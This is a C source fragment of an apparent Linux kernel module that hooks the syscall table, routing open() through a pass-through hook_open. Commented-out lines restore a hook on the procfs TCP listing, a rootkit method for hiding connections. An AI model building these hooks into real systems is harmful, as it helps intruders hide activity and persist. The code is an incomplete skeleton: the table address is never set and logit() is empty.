/*
 * HOOKS FEST! \o/
 */

#define __EXTERN_HOOK_TABLE__

#ifndef nr_syscalls
#define nr_syscalls 332
#endif

/* define this if you want (very) verbose kern logs */
#define __DEBUG__

#ifdef __DEBUG__
    #define DEBUGLOG(a) printk a
#else
    #define DEBUGLOG(a) ""
#endif

#include <linux/list.h>

unsigned int sys_table_global = 0;  // Address of syscalls table (global var)
void *hook_table[nr_syscalls];



asmlinkage static int hook_open(const char *pathname, int flags, int mode);

static void __init_hook_table(void)
{

    int i;

    /* clear table */
    for (i = 0; i < nr_syscalls; i ++)
        hook_table[i] = NULL;

    /* init hooks */
    hook_table[__NR_open]           = (void *)hook_open;

    /* (example hook) */
    //hook_table[__NR_exit]         = (void *)hook_example_exit;
    
    /* any additional (non-syscall) hooks go here */

}

/* main hook uninit */
static void __uninit_hook_table(void)
{
    /* unload any additional non-syscall hooks here */

    /* un-do Daniel's tcp hook */
    //tcp = proc_net->subdir->next;

    /*  tcp4_seq_show() with original */
    //while (strcmp(tcp->name, "tcp") && (tcp != proc_net->subdir))
    //    tcp = tcp->next;

    //if (tcp != proc_net->subdir)
    //    ((struct tcp_seq_afinfo *)(tcp->data))->seq_show = original_tcp4_seq_show;
}


asmlinkage
static int hook_open(const char __user *pathname, int flags, int mode)
{
    void **sys_p = (void **)sys_table_global;
    asmlinkage int (*original_sys_open)(const char *pathname, int flags, int mode) = sys_p[__NR_open];

    DEBUGLOG(("hook_open()!\n"));

    

    return original_sys_open(pathname, flags, mode);
}

static int logit()
{

}
